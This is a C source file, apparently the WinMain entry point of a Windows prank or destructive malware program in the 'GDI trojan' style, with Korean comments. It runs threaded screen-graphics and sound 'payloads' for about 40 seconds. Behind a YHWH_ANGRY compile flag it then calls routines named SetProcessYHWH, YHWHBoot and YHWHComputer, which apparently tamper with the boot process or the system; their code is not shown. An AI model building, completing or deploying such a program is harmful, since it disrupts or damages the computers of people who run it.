#include "YHWH.h"

int screen_width, screen_height;
static HANDLE g_hGfxGate = NULL;

static DWORD WINAPI default_sound_maker_thread(LPVOID lpParam) {
    S_YHWH_SOUND* p = (S_YHWH_SOUND*)lpParam;
    return default_sound_maker(*p);   // 값으로 복사 전달
}
static DWORD WINAPI default_graphic_maker_thread(LPVOID lpParam) {
    int v = (int)(INT_PTR)lpParam;   // ← 포인터를 다시 정수로 꺼냄(32/64 모두 안전)
    return default_graphic_maker(v); // 원래 시그니처 유지
}

BOOL run_parallel_per_index(int duration, S_YHWH_SOUND* snd) {
    HANDLE hGfx = CreateThread(NULL, 0, default_graphic_maker_thread,
        (LPVOID)(INT_PTR)duration, 0, NULL);
    if (!hGfx) return FALSE;

    // 사운드 4개는 그래픽과 ‘동시에’ 순차 실행 (그래픽을 멈추지 않음)
    for (int i = 0; i < 4; ++i) {
        HANDLE hSnd = CreateThread(NULL, 0, default_sound_maker_thread,
            (LPVOID)&snd[i], 0, NULL);
        if (!hSnd) { WaitForSingleObject(hGfx, INFINITE); CloseHandle(hGfx); return FALSE; }
        WaitForSingleObject(hSnd, INFINITE);
        CloseHandle(hSnd);
    }

    // 그래픽이 남은 프레임을 마칠 때까지 기다림 (총 40초 목표)
    WaitForSingleObject(hGfx, INFINITE);
    CloseHandle(hGfx);
    return TRUE;
}


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
#ifdef YHWH_ANGRY
    if (!SetProcessYHWH()) {
        YHWHComputer();
        return 0;
    }
#endif
    srand((unsigned)time(NULL)); 
    screen_width = GetSystemMetrics(SM_CXSCREEN);
    screen_height = GetSystemMetrics(SM_CYSCREEN);

    S_YHWH_SOUND* v_sound_payload =sound_payload(10);

    run_parallel_per_index(40,v_sound_payload);

    free(v_sound_payload);

#ifdef YHWH_ANGRY
    YHWHBoot();
    YHWHComputer();
#endif

    return 0;
}